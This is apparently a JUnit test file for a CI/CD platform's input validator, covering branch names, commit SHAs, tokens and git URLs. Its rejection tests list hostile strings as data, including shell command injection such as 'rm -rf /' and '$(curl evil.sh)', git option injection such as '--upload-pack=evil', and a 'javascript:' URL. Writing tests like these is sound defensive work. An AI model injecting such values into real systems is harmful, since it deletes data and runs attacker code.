package com.cicd.platform.controlplane.execution;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class ExecutionInputValidatorTest {

    @Test
    void isValidBranch_acceptsSafeBranch() {
        assertTrue(ExecutionInputValidator.isValidBranch("main"));
        assertTrue(ExecutionInputValidator.isValidBranch("feature/CI-123_fix"));
        assertTrue(ExecutionInputValidator.isValidBranch("release-v2.0.1"));
    }

    @Test
    void isValidBranch_rejectsUnsafeBranch() {
        assertFalse(ExecutionInputValidator.isValidBranch(null));
        assertFalse(ExecutionInputValidator.isValidBranch(""));
        assertFalse(ExecutionInputValidator.isValidBranch("main; rm -rf /"));
        assertFalse(ExecutionInputValidator.isValidBranch("main && echo pwned"));
        assertFalse(ExecutionInputValidator.isValidBranch("$(curl evil.sh)"));
        assertFalse(ExecutionInputValidator.isValidBranch("-c core.foo=bar"));
        assertFalse(ExecutionInputValidator.isValidBranch("main --upload-pack=evil"));
        assertFalse(ExecutionInputValidator.isValidBranch("a".repeat(256)));
    }

    @Test
    void isValidCommitSha_acceptsHexSha() {
        assertTrue(ExecutionInputValidator.isValidCommitSha("abc123"));
        assertTrue(ExecutionInputValidator.isValidCommitSha("abc123def456"));
        assertTrue(ExecutionInputValidator.isValidCommitSha("abcdefABCDEF0123456789abcdef0123456789abcd"));
    }

    @Test
    void isValidCommitSha_rejectsNonHex() {
        assertFalse(ExecutionInputValidator.isValidCommitSha(null));
        assertFalse(ExecutionInputValidator.isValidCommitSha(""));
        assertFalse(ExecutionInputValidator.isValidCommitSha("fail123"));
        assertFalse(ExecutionInputValidator.isValidCommitSha("unknown"));
        assertFalse(ExecutionInputValidator.isValidCommitSha("abc123; echo pwned"));
    }

    @Test
    void isValidSafeToken_acceptsSafeTokens() {
        assertTrue(ExecutionInputValidator.isValidSafeToken("sha123"));
        assertTrue(ExecutionInputValidator.isValidSafeToken("sha-1"));
        assertTrue(ExecutionInputValidator.isValidSafeToken("abc123def456"));
        assertTrue(ExecutionInputValidator.isValidSafeToken("abc123"));
    }

    @Test
    void isValidSafeToken_rejectsShellCharacters() {
        assertFalse(ExecutionInputValidator.isValidSafeToken("abc; rm -rf /"));
        assertFalse(ExecutionInputValidator.isValidSafeToken("abc && echo pwned"));
        assertFalse(ExecutionInputValidator.isValidSafeToken("$(curl evil.sh)"));
        assertFalse(ExecutionInputValidator.isValidSafeToken("abc def"));
        assertFalse(ExecutionInputValidator.isValidSafeToken("abc|whoami"));
        assertFalse(ExecutionInputValidator.isValidSafeToken("abc`id`"));
    }

    @Test
    void isValidGitUrl_acceptsHttpsUrl() {
        assertTrue(ExecutionInputValidator.isValidGitUrl("https://github.com/org/repo.git"));
        assertTrue(ExecutionInputValidator.isValidGitUrl("http://github.com/org/repo"));
    }

    @Test
    void isValidGitUrl_rejectsMalformedUrl() {
        assertFalse(ExecutionInputValidator.isValidGitUrl(null));
        assertFalse(ExecutionInputValidator.isValidGitUrl(""));
        assertFalse(ExecutionInputValidator.isValidGitUrl("x && rm -rf /"));
        assertFalse(ExecutionInputValidator.isValidGitUrl("git@github.com:org/repo.git"));
        assertFalse(ExecutionInputValidator.isValidGitUrl("javascript:alert(1)"));
        assertFalse(ExecutionInputValidator.isValidGitUrl("https://github.com/org/repo.git && evil"));
    }
}